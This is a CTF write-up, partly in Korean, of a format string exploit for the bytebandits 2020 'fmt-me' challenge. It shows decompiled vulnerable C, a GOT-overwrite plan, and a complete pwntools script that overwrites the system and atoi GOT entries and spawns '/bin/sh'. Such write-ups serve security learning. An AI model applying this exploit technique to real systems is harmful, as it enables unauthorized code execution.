## [bytebandits 2020] fmt-me writeup

#### [summary] fsb

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



### Analysis

```c
int get_int()
{
  char s; // [rsp+0h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fgets(&s, 10, stdin);
  return atoi(&s);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+10h] [rbp-110h]
  unsigned __int64 v5; // [rsp+118h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("Choose your name");
  puts("1. Lelouch 2. Saitama 3. Eren");
  printf("Choice: ");
  if ( get_int() == 2 )
  {
    puts("Good job. I'll give you a gift.");
    read(0, &buf, 0x100uLL);
    snprintf(other_buf, 0x100uLL, &buf);
    system("echo 'saitama, the real hero'");
  }
  return 0;
}
```



익스 시나리오

1. system@got <= main + 0x98
2. atoi@got <= system@plt+6
3. atoi@got <= system@plt+6 (4바이트씩 덮음)
4. system@got <= get_int() + 1



### Exploit.py

```python
from pwn import *

EXE = './fmt'
HOST = 'pwn.byteband.it'
PORT = 6969

#context.log_level = 'debug'

if args.REMOTE:
    r = remote(HOST, PORT)
else :
    r = process(EXE)

#gdb.attach(r, 'b* main+222')

r.sendlineafter("Choice: ", '2')
payload = '%{}c%cc'.format(0x040128F - 2) # 0x040128F is main + 0x98
payload += '%8$n'
payload += p64(0x404028)
r.sendlineafter("a gift.\n", payload)

payload = '%8$n%ccc'
payload += p64(0x40405c)
r.sendlineafter("a gift.\n", payload)

payload = '%{}c%c'.format(0x401056 - 1)
payload += '%10$n'
payload += p64(0x404058)
r.sendlineafter("a gift.\n", payload)

payload = '%{}c%c'.format(0x004011A7 - 1)
payload += '%11$n'
payload += p64(0x404028)
r.sendlineafter("a gift.\n", payload)

r.sendline('/bin/sh;')

r.interactive()

```



### Fucking

1. `snprintf()`로 하는거라 주소 값의 0x00 때문에 문자열이 끊김.
2. 처음에는 system@got를 main 시작주소로 덮었는데, atoi@got가 4바이트씩 덮여서 짜증났었음.
3. do_system()에서 movaps instruction error 발생
   인자의 주소가 16 align 하지 않아서 발생한 오류인데, 대충 아무렇게나 뛰어서 생긴 문제.
   => get_int() + 1로 뜀으로써 `push rbp` instruction을 스킵해서 해결하였다.